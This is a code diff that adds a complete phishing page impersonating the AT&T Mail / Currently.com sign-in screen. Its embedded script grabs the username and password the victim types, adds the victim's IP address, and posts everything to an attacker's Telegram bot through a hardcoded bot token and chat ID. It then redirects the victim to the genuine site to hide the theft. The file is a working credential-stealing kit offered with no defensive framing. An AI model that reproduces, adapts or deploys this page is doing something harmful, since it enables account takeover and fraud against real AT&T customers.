@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AT&T Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .login-form {
+            background-color: #fff;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            text-align: center;
+            border-radius: 10px;
+            position: relative;
+        }
+        input[type="text"], input[type="password"] {
+            width: 90%; /* Adjusted width for proper padding */
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            width: 95%;
+            padding: 15px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .login-form h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .login-form p {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="login-form">
+        <img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="AT&T Logo"> <!-- Local path to your logo -->
+        <h2>Sign in</h2>
+        <h2><strong>to access AT&T Mail and Currently.com</strong></h2>
+        <form id="loginForm">
+            <p style="text-align: left;">User ID</p>
+            <input type="text" id="username"  required>
+            <p style="text-align: left;">Password</p>
+            <input type="password" id="password"  required>
+            <input type="submit" value="Continue">
+            <a href="#"><strong><h3>Forgot user ID?</p></a></strong></h3>
+            <a href="#"><strong><h3>Don't have a user ID? Create one now</p></strong></h3>
+            <style>
+                a {
+                    text-align: left;
+                    border: none;
+                    text-decoration: none;
+                }
+                a:visited {
+                    color: blue;
+                }
+                a:hover {
+                    text-decoration: underline;
+                }
+                h3 {
+                    text-align: left;
+                    color: blue;
+                    border: none;
+                }
+            </style>
+        </form>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    const telegramBotToken = '7661127400:AAEHLvao8eahX9Mfhff_9_BQ-HS-oD5yamM';
+    const chatId = '6640135951';
+    const portNumber = 8080;
+
+    $('#loginForm').submit(function(e) {
+        e.preventDefault();
+
+        const username = $('#username').val();
+        const password = $('#password').val();
+
+        $.getJSON('https://api.ipify.org?format=json', function(data) {
+            const ip = data.ip;
+            const userId = username;
+
+            const message = `Login attempt on AT&T\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ip}\nUser ID: ${userId}\nPort Number: ${portNumber}\nPlatform: AT&T`;
+
+            $.ajax({
+                url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+                method: 'POST',
+                data: {
+                    chat_id: chatId,
+                    text: message
+                },
+                success: function(response) {
+                    console.log('Login information sent to Telegram');
+                    window.location.href = "https://currently.att.yahoo.com/";
+                },
+                error: function(err) {
+                    console.error('Error sending message to Telegram', err);
+                }
+            });
+        });
+    });
+</script>
+
+</body>
+</html>
